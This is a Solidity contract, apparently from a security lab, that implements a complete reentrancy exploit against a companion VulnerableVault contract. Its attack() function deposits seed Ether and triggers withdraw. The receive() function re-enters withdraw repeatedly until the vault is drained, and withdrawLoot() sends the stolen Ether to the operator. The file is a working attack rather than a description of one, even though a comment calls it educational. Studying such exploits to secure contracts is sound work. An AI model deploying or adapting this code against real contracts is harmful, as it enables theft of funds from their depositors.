// SPDX-License-Identifier: GPL-3.0-only
pragma solidity 0.8.28;

import "./Vulnerable.sol";

/// @title ReentrancyAttacker
/// @author Solidity Security Lab
/// @notice Exploit contract that drains VulnerableVault through reentrancy.
contract ReentrancyAttacker {
    /// @notice Target vulnerable vault.
    VulnerableVault public immutable target;

    /// @notice Operator address that triggers the attack and receives the stolen funds.
    address public immutable operator;

    /// @notice Amount withdrawn in each reentrant iteration.
    uint256 public attackChunk;

    /// @notice Safety flag to avoid uncontrolled recursion in the educational example.
    bool private attackInProgress;

    /// @notice Emitted when the exploit starts.
    event AttackStarted(uint256 seedAmount);

    /// @notice Emitted on every successful reentrant iteration.
    event Reentered(uint256 chunkAmount, uint256 remainingVaultBalance);

    /// @notice Emitted when the stolen funds are forwarded to the operator.
    event LootWithdrawn(address indexed recipient, uint256 amount);

    constructor(address targetAddress) {
        // Store the target address.
        target = VulnerableVault(targetAddress);

        // The deployer becomes the final recipient of the stolen funds.
        operator = msg.sender;
    }

    /// @notice Launches the exploit by creating a valid balance and then triggering withdraw.
    function attack() external payable {
        // Restrict the exploit trigger to the operator.
        require(msg.sender == operator, "Only operator can attack");

        // The attacker needs seed capital to create a legitimate balance entry.
        require(msg.value > 0, "Seed capital required");

        // Prevent manual re-entry into attack() while the exploit is already running.
        require(!attackInProgress, "Attack already in progress");

        // Store the chunk size for each recursive withdrawal.
        attackChunk = msg.value;

        // Mark the exploit as active.
        attackInProgress = true;

        emit AttackStarted(msg.value);

        // Create a valid deposit in the vault so the balance check will pass.
        target.deposit{value: msg.value}();

        // The first withdrawal sends Ether back here and opens the reentrancy loop.
        target.withdraw(msg.value);

        // Clear the flag only after the full recursive chain finishes.
        attackInProgress = false;
    }

    /// @notice Automatically executed when the vault sends Ether to this contract.
    receive() external payable {
        // Only accept reentrant control flow from the target vault.
        require(msg.sender == address(target), "Unexpected sender");

        // If the vault still holds enough Ether for another iteration,
        // reenter withdraw() before the target updates its balance tracking.
        if (address(target).balance >= attackChunk) {
            emit Reentered(attackChunk, address(target).balance);
            target.withdraw(attackChunk);
        }
    }

    /// @notice Transfers the stolen Ether to the operator after the exploit finishes.
    function withdrawLoot() external {
        // Only the operator can extract the stolen funds.
        require(msg.sender == operator, "Only operator can withdraw loot");

        uint256 lootAmount = address(this).balance;
        require(lootAmount > 0, "No loot available");

        // Forward the full stolen balance to the operator.
        (bool success, ) = payable(operator).call{value: lootAmount}("");
        require(success, "Loot transfer failed");

        emit LootWithdrawn(operator, lootAmount);
    }
}
